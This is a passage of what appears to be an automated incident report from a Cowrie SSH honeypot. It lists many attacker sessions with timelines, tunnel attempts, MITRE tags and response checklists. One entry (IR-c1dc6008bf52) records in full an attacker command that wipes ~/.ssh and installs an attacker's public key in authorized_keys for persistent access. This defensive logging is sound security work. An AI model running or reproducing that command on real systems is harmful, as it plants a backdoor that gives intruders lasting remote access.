| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:31:46` | `cowrie.session.connect` |
| `2026-03-16 02:31:47` | `cowrie.client.version` |
| `2026-03-16 02:31:47` | `cowrie.client.kex` |
| `2026-03-16 02:31:49` | `cowrie.login.success` |
| `2026-03-16 02:31:50` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.141[.]172` to AbuseIPDB if not already reported
- [ ] Block `200.105.141[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-827f506b128c

| Field | Detail |
|---|---|
| **Source IP** | `211.223.41[.]90` |
| **First Seen** | 2026-03-16 02:33 |
| **Last Seen** | 2026-03-16 02:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:33:53` | `cowrie.session.connect` |
| `2026-03-16 02:33:54` | `cowrie.client.version` |
| `2026-03-16 02:33:54` | `cowrie.client.kex` |
| `2026-03-16 02:33:56` | `cowrie.login.success` |
| `2026-03-16 02:33:56` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.223.41[.]90` to AbuseIPDB if not already reported
- [ ] Block `211.223.41[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6017993473e

| Field | Detail |
|---|---|
| **Source IP** | `218.149.235[.]152` |
| **First Seen** | 2026-03-16 02:34 |
| **Last Seen** | 2026-03-16 02:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:34:02` | `cowrie.session.connect` |
| `2026-03-16 02:34:03` | `cowrie.client.version` |
| `2026-03-16 02:34:03` | `cowrie.client.kex` |
| `2026-03-16 02:34:05` | `cowrie.login.success` |
| `2026-03-16 02:34:05` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `218.149.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aefc867bafa2

| Field | Detail |
|---|---|
| **Source IP** | `83.206.50[.]182` |
| **First Seen** | 2026-03-16 02:34 |
| **Last Seen** | 2026-03-16 02:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:34:04` | `cowrie.session.connect` |
| `2026-03-16 02:34:04` | `cowrie.client.version` |
| `2026-03-16 02:34:04` | `cowrie.client.kex` |
| `2026-03-16 02:34:05` | `cowrie.login.success` |
| `2026-03-16 02:34:05` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.206.50[.]182` to AbuseIPDB if not already reported
- [ ] Block `83.206.50[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85f64d056dcf

| Field | Detail |
|---|---|
| **Source IP** | `24.47.243[.]113` |
| **First Seen** | 2026-03-16 02:34 |
| **Last Seen** | 2026-03-16 02:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:34:10` | `cowrie.session.connect` |
| `2026-03-16 02:34:11` | `cowrie.client.version` |
| `2026-03-16 02:34:11` | `cowrie.client.kex` |
| `2026-03-16 02:34:12` | `cowrie.login.success` |
| `2026-03-16 02:34:13` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.47.243[.]113` to AbuseIPDB if not already reported
- [ ] Block `24.47.243[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3b8cdf82d0d

| Field | Detail |
|---|---|
| **Source IP** | `103.220.91[.]138` |
| **First Seen** | 2026-03-16 02:34 |
| **Last Seen** | 2026-03-16 02:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:34:39` | `cowrie.session.connect` |
| `2026-03-16 02:34:40` | `cowrie.client.version` |
| `2026-03-16 02:34:40` | `cowrie.client.kex` |
| `2026-03-16 02:34:41` | `cowrie.login.success` |
| `2026-03-16 02:34:41` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:34:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.220.91[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.220.91[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91bf96b95a37

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]239` |
| **First Seen** | 2026-03-16 02:34 |
| **Last Seen** | 2026-03-16 02:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:34:51` | `cowrie.session.connect` |
| `2026-03-16 02:34:51` | `cowrie.client.version` |
| `2026-03-16 02:34:51` | `cowrie.client.kex` |
| `2026-03-16 02:34:53` | `cowrie.login.success` |
| `2026-03-16 02:34:54` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]239` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]239` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dcd516e43c4

| Field | Detail |
|---|---|
| **Source IP** | `222.116.9[.]180` |
| **First Seen** | 2026-03-16 02:35 |
| **Last Seen** | 2026-03-16 02:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:35:53` | `cowrie.session.connect` |
| `2026-03-16 02:35:54` | `cowrie.client.version` |
| `2026-03-16 02:35:54` | `cowrie.client.kex` |
| `2026-03-16 02:35:56` | `cowrie.login.success` |
| `2026-03-16 02:35:57` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.116.9[.]180` to AbuseIPDB if not already reported
- [ ] Block `222.116.9[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d903dff7d321

| Field | Detail |
|---|---|
| **Source IP** | `111.70.49[.]180` |
| **First Seen** | 2026-03-16 02:37 |
| **Last Seen** | 2026-03-16 02:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:37:20` | `cowrie.session.connect` |
| `2026-03-16 02:37:21` | `cowrie.client.version` |
| `2026-03-16 02:37:21` | `cowrie.client.kex` |
| `2026-03-16 02:37:23` | `cowrie.login.success` |
| `2026-03-16 02:37:24` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.49[.]180` to AbuseIPDB if not already reported
- [ ] Block `111.70.49[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e61e6a5c941

| Field | Detail |
|---|---|
| **Source IP** | `218.149.235[.]152` |
| **First Seen** | 2026-03-16 02:37 |
| **Last Seen** | 2026-03-16 02:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:37:21` | `cowrie.session.connect` |
| `2026-03-16 02:37:22` | `cowrie.client.version` |
| `2026-03-16 02:37:22` | `cowrie.client.kex` |
| `2026-03-16 02:37:24` | `cowrie.login.success` |
| `2026-03-16 02:37:25` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:37:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `218.149.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8ff3f8e524a

| Field | Detail |
|---|---|
| **Source IP** | `61.79.227[.]51` |
| **First Seen** | 2026-03-16 02:37 |
| **Last Seen** | 2026-03-16 02:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:37:30` | `cowrie.session.connect` |
| `2026-03-16 02:37:31` | `cowrie.client.version` |
| `2026-03-16 02:37:31` | `cowrie.client.kex` |
| `2026-03-16 02:37:33` | `cowrie.login.success` |
| `2026-03-16 02:37:34` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.79.227[.]51` to AbuseIPDB if not already reported
- [ ] Block `61.79.227[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-579dfc87868c

| Field | Detail |
|---|---|
| **Source IP** | `117.205.3[.]26` |
| **First Seen** | 2026-03-16 02:37 |
| **Last Seen** | 2026-03-16 02:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:37:40` | `cowrie.session.connect` |
| `2026-03-16 02:37:40` | `cowrie.client.version` |
| `2026-03-16 02:37:40` | `cowrie.client.kex` |
| `2026-03-16 02:37:42` | `cowrie.login.success` |
| `2026-03-16 02:37:42` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.205.3[.]26` to AbuseIPDB if not already reported
- [ ] Block `117.205.3[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34b3339ab271

| Field | Detail |
|---|---|
| **Source IP** | `37.153.194[.]108` |
| **First Seen** | 2026-03-16 02:38 |
| **Last Seen** | 2026-03-16 02:43 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:38:12` | `cowrie.session.connect` |
| `2026-03-16 02:38:12` | `cowrie.client.version` |
| `2026-03-16 02:38:12` | `cowrie.client.kex` |
| `2026-03-16 02:38:13` | `cowrie.login.success` |
| `2026-03-16 02:38:13` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.153.194[.]108` to AbuseIPDB if not already reported
- [ ] Block `37.153.194[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1dc6008bf52

| Field | Detail |
|---|---|
| **Source IP** | `101.36.109[.]176` |
| **First Seen** | 2026-03-16 02:38 |
| **Last Seen** | 2026-03-16 02:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:38:46` | `cowrie.session.connect` |
| `2026-03-16 02:38:46` | `cowrie.client.version` |
| `2026-03-16 02:38:46` | `cowrie.client.kex` |
| `2026-03-16 02:38:47` | `cowrie.login.success` |
| `2026-03-16 02:38:47` | `cowrie.session.params` |
| `2026-03-16 02:38:47` | `cowrie.command.input` |
| `2026-03-16 02:38:47` | `cowrie.command.failed` |
| `2026-03-16 02:38:47` | `cowrie.log.closed` |
| `2026-03-16 02:38:47` | `cowrie.session.params` |
| `2026-03-16 02:38:47` | `cowrie.command.input` |
| `2026-03-16 02:38:47` | `cowrie.session.file_download` |
| `2026-03-16 02:38:47` | `cowrie.log.closed` |
| `2026-03-16 02:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.109[.]176` to AbuseIPDB if not already reported
- [ ] Block `101.36.109[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7862887dde55

| Field | Detail |
|---|---|
| **Source IP** | `101.36.109[.]176` |
| **First Seen** | 2026-03-16 02:38 |
| **Last Seen** | 2026-03-16 02:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:38:49` | `cowrie.session.connect` |
| `2026-03-16 02:38:49` | `cowrie.client.version` |
| `2026-03-16 02:38:49` | `cowrie.client.kex` |
| `2026-03-16 02:38:50` | `cowrie.login.success` |
| `2026-03-16 02:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.109[.]176` to AbuseIPDB if not already reported
- [ ] Block `101.36.109[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67e310c71e83

| Field | Detail |
|---|---|
| **Source IP** | `76.132.238[.]43` |
| **First Seen** | 2026-03-16 02:39 |
| **Last Seen** | 2026-03-16 02:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:39:58` | `cowrie.session.connect` |
| `2026-03-16 02:39:59` | `cowrie.client.version` |
| `2026-03-16 02:39:59` | `cowrie.client.kex` |
| `2026-03-16 02:40:01` | `cowrie.login.success` |
| `2026-03-16 02:40:02` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:40:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.132.238[.]43` to AbuseIPDB if not already reported
- [ ] Block `76.132.238[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c0051b48376

| Field | Detail |
|---|---|
| **Source IP** | `67.43.240[.]149` |
| **First Seen** | 2026-03-16 02:40 |
| **Last Seen** | 2026-03-16 02:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:40:11` | `cowrie.session.connect` |
| `2026-03-16 02:40:12` | `cowrie.client.version` |
| `2026-03-16 02:40:12` | `cowrie.client.kex` |
| `2026-03-16 02:40:13` | `cowrie.login.success` |
| `2026-03-16 02:40:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `67.43.240[.]149` to AbuseIPDB if not already reported
- [ ] Block `67.43.240[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b41c0e21e8b7

| Field | Detail |
|---|---|
| **Source IP** | `125.20.228[.]146` |
| **First Seen** | 2026-03-16 02:40 |
| **Last Seen** | 2026-03-16 02:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:40:50` | `cowrie.session.connect` |
| `2026-03-16 02:40:51` | `cowrie.client.version` |
| `2026-03-16 02:40:51` | `cowrie.client.kex` |
| `2026-03-16 02:40:52` | `cowrie.login.success` |
| `2026-03-16 02:40:52` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:40:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.20.228[.]146` to AbuseIPDB if not already reported
- [ ] Block `125.20.228[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63101dde6217

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]236` |
| **First Seen** | 2026-03-16 02:40 |
| **Last Seen** | 2026-03-16 02:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:40:57` | `cowrie.session.connect` |
| `2026-03-16 02:40:58` | `cowrie.client.version` |
| `2026-03-16 02:40:58` | `cowrie.client.kex` |
| `2026-03-16 02:40:59` | `cowrie.login.success` |
| `2026-03-16 02:41:00` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:41:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]236` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-449091421593

| Field | Detail |
|---|---|
| **Source IP** | `68.7.114[.]69` |
| **First Seen** | 2026-03-16 02:41 |
| **Last Seen** | 2026-03-16 02:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:41:32` | `cowrie.session.connect` |
| `2026-03-16 02:41:32` | `cowrie.client.version` |
| `2026-03-16 02:41:32` | `cowrie.client.kex` |
| `2026-03-16 02:41:34` | `cowrie.login.success` |
| `2026-03-16 02:41:35` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:41:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.7.114[.]69` to AbuseIPDB if not already reported
- [ ] Block `68.7.114[.]69` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49e4aa726a04

| Field | Detail |
|---|---|
| **Source IP** | `60.220.241[.]50` |
| **First Seen** | 2026-03-16 02:41 |
| **Last Seen** | 2026-03-16 02:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:41:40` | `cowrie.session.connect` |
| `2026-03-16 02:41:40` | `cowrie.client.version` |
| `2026-03-16 02:41:40` | `cowrie.client.kex` |
| `2026-03-16 02:41:42` | `cowrie.login.success` |
| `2026-03-16 02:41:42` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:41:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.220.241[.]50` to AbuseIPDB if not already reported
- [ ] Block `60.220.241[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1131db9d8351

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]128` |
| **First Seen** | 2026-03-16 02:43 |
| **Last Seen** | 2026-03-16 02:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:43:16` | `cowrie.session.connect` |
| `2026-03-16 02:43:17` | `cowrie.client.version` |
| `2026-03-16 02:43:17` | `cowrie.client.kex` |
| `2026-03-16 02:43:18` | `cowrie.login.success` |
| `2026-03-16 02:43:19` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:43:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b1f7b395bfb

| Field | Detail |
|---|---|
| **Source IP** | `125.20.228[.]146` |
| **First Seen** | 2026-03-16 02:45 |
| **Last Seen** | 2026-03-16 02:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:45:46` | `cowrie.session.connect` |
| `2026-03-16 02:45:47` | `cowrie.client.version` |
| `2026-03-16 02:45:47` | `cowrie.client.kex` |
| `2026-03-16 02:45:49` | `cowrie.login.success` |
| `2026-03-16 02:45:49` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.20.228[.]146` to AbuseIPDB if not already reported
- [ ] Block `125.20.228[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a987daa7c500

| Field | Detail |
|---|---|
| **Source IP** | `122.187.225[.]220` |
| **First Seen** | 2026-03-16 02:45 |
| **Last Seen** | 2026-03-16 02:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:45:54` | `cowrie.session.connect` |
| `2026-03-16 02:45:54` | `cowrie.client.version` |
| `2026-03-16 02:45:54` | `cowrie.client.kex` |
| `2026-03-16 02:45:55` | `cowrie.login.success` |
| `2026-03-16 02:45:56` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:46:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.225[.]220` to AbuseIPDB if not already reported
- [ ] Block `122.187.225[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fef0bd1397ba

| Field | Detail |
|---|---|
| **Source IP** | `112.194.142[.]167` |
| **First Seen** | 2026-03-16 02:46 |
| **Last Seen** | 2026-03-16 02:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:46:04` | `cowrie.session.connect` |
| `2026-03-16 02:46:05` | `cowrie.client.version` |
| `2026-03-16 02:46:05` | `cowrie.client.kex` |
| `2026-03-16 02:46:07` | `cowrie.login.success` |
| `2026-03-16 02:46:07` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.194.142[.]167` to AbuseIPDB if not already reported
- [ ] Block `112.194.142[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
